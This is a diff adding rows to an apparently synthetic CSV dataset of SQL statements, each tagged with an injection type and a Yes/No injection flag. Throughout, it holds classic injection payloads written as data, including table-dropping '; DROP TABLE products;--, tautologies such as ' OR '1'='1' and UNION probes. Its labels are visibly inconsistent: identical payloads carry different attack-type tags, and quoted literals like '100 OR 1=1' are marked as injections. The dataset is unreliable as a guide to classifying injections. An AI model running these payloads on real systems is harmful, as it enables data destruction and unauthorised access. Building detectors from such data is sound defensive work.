+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Union-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Error-based,Yes
+SELECT * FROM products WHERE name = '2',None,No
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM users WHERE id = '1',None,No
+SELECT * FROM products WHERE name = '' OR 1=1;--',Boolean-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Boolean-based,Yes
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Error-based,Yes
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Time-based,Yes
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Union-based,Yes
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Error-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Union-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Union-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
+DELETE FROM orders WHERE order_id = 100,None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Boolean-based,Yes
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Boolean-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT email FROM customers WHERE email = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Error-based,Yes
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Time-based,Yes
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Union-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Error-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Error-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Boolean-based,Yes
+SELECT * FROM products WHERE name = '100 OR 1=1',Time-based,Yes
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Union-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Union-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Union-based,Yes
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT * FROM users WHERE id = '2',None,No
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Union-based,Yes
+SELECT * FROM products WHERE name = '100 OR 1=1',Time-based,Yes
+DELETE FROM orders WHERE order_id = 1,None,No
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 100,None,No
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Union-based,Yes
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Time-based,Yes
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Error-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Time-based,Yes
+SELECT * FROM products WHERE name = '100 OR 1=1',Time-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Error-based,Yes
+SELECT * FROM products WHERE name = '100',None,No
+SELECT * FROM users WHERE id = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM products WHERE name = '2',None,No
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Error-based,Yes
+SELECT * FROM products WHERE name = '1',None,No
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT * FROM products WHERE name = '1',None,No
+SELECT * FROM products WHERE name = '' OR 1=1;--',Union-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Error-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+SELECT * FROM users WHERE id = '' OR 1=1;--',Union-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Time-based,Yes
+SELECT * FROM products WHERE name = '2',None,No
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+SELECT * FROM users WHERE id = '100 OR 1=1',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+SELECT * FROM products WHERE name = '2',None,No
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Boolean-based,Yes
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Error-based,Yes
+SELECT email FROM customers WHERE email = 'apple',None,No
+SELECT * FROM products WHERE name = '' OR 1=1;--',Time-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Time-based,Yes
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Error-based,Yes
+SELECT * FROM users WHERE id = '1',None,No
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 100,None,No
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+SELECT * FROM users WHERE id = '' OR 1=1;--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM users WHERE id = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Error-based,Yes
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Time-based,Yes
+DELETE FROM orders WHERE order_id = 2,None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM users WHERE id = '100',None,No
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+SELECT * FROM products WHERE name = '1',None,No
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Union-based,Yes
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Time-based,Yes
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Boolean-based,Yes
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = apple,None,No
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Time-based,Yes
+SELECT * FROM products WHERE name = '2',None,No
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Time-based,Yes
+SELECT * FROM users WHERE id = '100',None,No
+SELECT * FROM users WHERE id = 'apple',None,No
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Time-based,Yes
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Union-based,Yes
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Union-based,Yes
+SELECT email FROM customers WHERE email = '100 OR 1=1',Time-based,Yes
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Time-based,Yes
+DELETE FROM orders WHERE order_id = 100,None,No
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE id = '100',None,No
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Union-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+SELECT * FROM products WHERE name = '' OR 1=1;--',Union-based,Yes
+SELECT email FROM customers WHERE email = '1',None,No
+UPDATE accounts SET balance=500 WHERE id=john.doe@example.com,None,No
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Boolean-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Error-based,Yes
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Boolean-based,Yes
+SELECT * FROM users WHERE id = '100',None,No
+SELECT * FROM users WHERE id = 'apple',None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Union-based,Yes
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT * FROM users WHERE id = '2',None,No
+SELECT email FROM customers WHERE email = 'apple',None,No
+SELECT * FROM users WHERE id = 'apple',None,No
+DELETE FROM orders WHERE order_id = 2,None,No
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Time-based,Yes
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+SELECT * FROM products WHERE name = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Union-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
+SELECT * FROM products WHERE name = '1',None,No
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Union-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Time-based,Yes
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Error-based,Yes
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT * FROM users WHERE id = '100',None,No
+DELETE FROM orders WHERE order_id = 1,None,No
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Error-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=john.doe@example.com,None,No
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Union-based,Yes
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+UPDATE accounts SET balance=500 WHERE id=john.doe@example.com,None,No
+SELECT * FROM products WHERE name = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Union-based,Yes
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Boolean-based,Yes
+SELECT * FROM products WHERE name = 'apple',None,No
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Error-based,Yes
+DELETE FROM orders WHERE order_id = 1,None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+DELETE FROM orders WHERE order_id = 100,None,No
+SELECT * FROM products WHERE name = 'apple',None,No
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Union-based,Yes
+SELECT * FROM products WHERE name = 'apple',None,No
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT email FROM customers WHERE email = 'apple',None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Boolean-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = 'apple',None,No
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Boolean-based,Yes
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Error-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Error-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Time-based,Yes
+SELECT * FROM users WHERE id = '100',None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Union-based,Yes
+SELECT * FROM products WHERE name = '100 OR 1=1',Union-based,Yes
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Time-based,Yes
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Error-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Boolean-based,Yes
+SELECT * FROM products WHERE name = '100',None,No
+SELECT * FROM users WHERE id = '100 OR 1=1',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Error-based,Yes
+SELECT * FROM products WHERE name = 'apple',None,No
+SELECT * FROM users WHERE id = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM users WHERE id = '2',None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Time-based,Yes
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Union-based,Yes
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Error-based,Yes
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+SELECT * FROM users WHERE id = 'apple',None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=john.doe@example.com,None,No
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Boolean-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+DELETE FROM orders WHERE order_id = 100,None,No
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Boolean-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Union-based,Yes
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+SELECT * FROM products WHERE name = 'apple',None,No
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Error-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Union-based,Yes
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT * FROM users WHERE id = '1',None,No
+SELECT * FROM users WHERE id = 'apple',None,No
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Union-based,Yes
+SELECT * FROM products WHERE name = 'apple',None,No
+SELECT * FROM users WHERE id = '100',None,No
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Boolean-based,Yes
+SELECT * FROM products WHERE name = '2',None,No
+SELECT * FROM products WHERE name = 'apple',None,No
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Error-based,Yes
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Union-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+SELECT * FROM products WHERE name = 'apple',None,No
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Error-based,Yes
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Union-based,Yes
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Time-based,Yes
+DELETE FROM orders WHERE order_id = ' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM products WHERE name = '' OR 1=1;--',Boolean-based,Yes
+SELECT * FROM products WHERE name = 'apple',None,No
+SELECT email FROM customers WHERE email = 'apple',None,No
+SELECT * FROM users WHERE id = '' OR 1=1;--',Error-based,Yes
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT email FROM customers WHERE email = '1',None,No
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Error-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Boolean-based,Yes
+SELECT * FROM users WHERE id = 'apple',None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+DELETE FROM orders WHERE order_id = 1,None,No
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+SELECT email FROM customers WHERE email = '100',None,No
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Union-based,Yes
+SELECT * FROM products WHERE name = 'apple',None,No
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Union-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Error-based,Yes
+SELECT * FROM products WHERE name = '1',None,No
+SELECT * FROM products WHERE name = '2',None,No
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Union-based,Yes
+SELECT * FROM products WHERE name = '1',None,No
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+DELETE FROM orders WHERE order_id = 2,None,No
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Error-based,Yes
+SELECT * FROM products WHERE name = '' OR 1=1;--',Error-based,Yes
+DELETE FROM orders WHERE order_id = 1,None,No
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM products WHERE name = '1',None,No
+SELECT email FROM customers WHERE email = '1',None,No
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Error-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Time-based,Yes
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 2,None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Time-based,Yes
+SELECT * FROM users WHERE id = '' OR '1'='1';--',Union-based,Yes
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Union-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Error-based,Yes
+DELETE FROM orders WHERE order_id = apple,None,No
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Time-based,Yes
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Time-based,Yes
+DELETE FROM orders WHERE order_id = apple,None,No
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Time-based,Yes
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Time-based,Yes
+SELECT * FROM products WHERE name = '2',None,No
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Boolean-based,Yes
+SELECT email FROM customers WHERE email = 'apple',None,No
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Time-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Union-based,Yes
+SELECT * FROM products WHERE name = '1',None,No
+SELECT * FROM products WHERE name = '1',None,No
+DELETE FROM orders WHERE order_id = 2,None,No
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT email FROM customers WHERE email = '100',None,No
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Time-based,Yes
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+SELECT * FROM users WHERE id = '1',None,No
+SELECT email FROM customers WHERE email = 'apple',None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Error-based,Yes
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+SELECT * FROM users WHERE id = '2',None,No
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Error-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Boolean-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM products WHERE name = '' OR 1=1;--',Error-based,Yes
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 1,None,No
+SELECT email FROM customers WHERE email = 'apple',None,No
+DELETE FROM orders WHERE order_id = john.doe@example.com,None,No
+UPDATE accounts SET balance=500 WHERE id=' UNION SELECT NULL,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=2,None,No
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Error-based,Yes
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 2,None,No
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT * FROM users WHERE id = '' OR 1=1;--',Union-based,Yes
+DELETE FROM orders WHERE order_id = '; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM products WHERE name = '' OR '1'='1';--',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=john.doe@example.com,None,No
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Union-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Union-based,Yes
+SELECT * FROM products WHERE name = '1',None,No
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Union-based,Yes
+SELECT * FROM products WHERE name = '' UNION SELECT NULL',Boolean-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100,None,No
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Error-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Union-based,Yes
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT email FROM customers WHERE email = 'john.doe@example.com',None,No
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Time-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Union-based,Yes
+SELECT email FROM customers WHERE email = '100 OR 1=1',Error-based,Yes
+SELECT * FROM products WHERE name = ''; DROP TABLE products;--',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+DELETE FROM orders WHERE order_id = 2,None,No
+UPDATE accounts SET balance=500 WHERE id='; DROP TABLE products;--,Error-based,Yes
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Boolean-based,Yes
+SELECT * FROM products WHERE name = '2',None,No
+SELECT * FROM products WHERE name = 'apple',None,No
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+SELECT * FROM users WHERE id = '100',None,No
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Error-based,Yes
+SELECT email FROM customers WHERE email = '100 OR 1=1',Boolean-based,Yes
+SELECT email FROM customers WHERE email = 'apple',None,No
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT * FROM users WHERE id = '' OR 1=1;--',Error-based,Yes
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Error-based,Yes
+DELETE FROM orders WHERE order_id = apple,None,No
+DELETE FROM orders WHERE order_id = 100,None,No
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT email FROM customers WHERE email = '100 OR 1=1',Boolean-based,Yes
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT email FROM customers WHERE email = '' OR 1=1;--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=1,None,No
+SELECT * FROM products WHERE name = '1',None,No
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Time-based,Yes
+SELECT email FROM customers WHERE email = '100',None,No
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Union-based,Yes
+DELETE FROM orders WHERE order_id = 100,None,No
+SELECT * FROM users WHERE id = '' UNION SELECT NULL',Boolean-based,Yes
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Error-based,Yes
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT * FROM users WHERE id = '100 OR 1=1',Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Error-based,Yes
+SELECT * FROM users WHERE id = '2',None,No
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Boolean-based,Yes
+SELECT email FROM customers WHERE email = 'apple',None,No
+SELECT email FROM customers WHERE email = '' UNION SELECT NULL',Union-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id = 2,None,No
+SELECT email FROM customers WHERE email = '1',None,No
+SELECT * FROM users WHERE id = 'apple',None,No
+SELECT * FROM products WHERE name = '' OR 1=1;--',Time-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Time-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Union-based,Yes
+SELECT * FROM users WHERE id = ''; DROP TABLE products;--',Union-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR '1'='1';--,Time-based,Yes
+SELECT email FROM customers WHERE email = '' OR '1'='1';--',Error-based,Yes
+SELECT * FROM users WHERE id = 'john.doe@example.com',None,No
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Union-based,Yes
+SELECT * FROM products WHERE name = 'john.doe@example.com',None,No
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Error-based,Yes
+SELECT email FROM customers WHERE email = '100',None,No
+DELETE FROM orders WHERE order_id = apple,None,No
+SELECT * FROM products WHERE name = '2',None,No
+SELECT * FROM products WHERE name = '100 OR 1=1',Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=100 OR 1=1,Error-based,Yes
+DELETE FROM orders WHERE order_id = ' OR 1=1;--,Error-based,Yes
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Boolean-based,Yes
+UPDATE accounts SET balance=500 WHERE id=' OR 1=1;--,Time-based,Yes
+SELECT * FROM users WHERE id = '' OR 1=1;--',Boolean-based,Yes
+SELECT email FROM customers WHERE email = '2',None,No
+SELECT email FROM customers WHERE email = ''; DROP TABLE products;--',Union-based,Yes
+DELETE FROM orders WHERE order_id = ' UNION SELECT NULL,Time-based,Yes
+UPDATE accounts SET balance=500 WHERE id=apple,None,No
+DELETE FROM orders WHERE order_id = 100 OR 1=1,Boolean-based,Yes
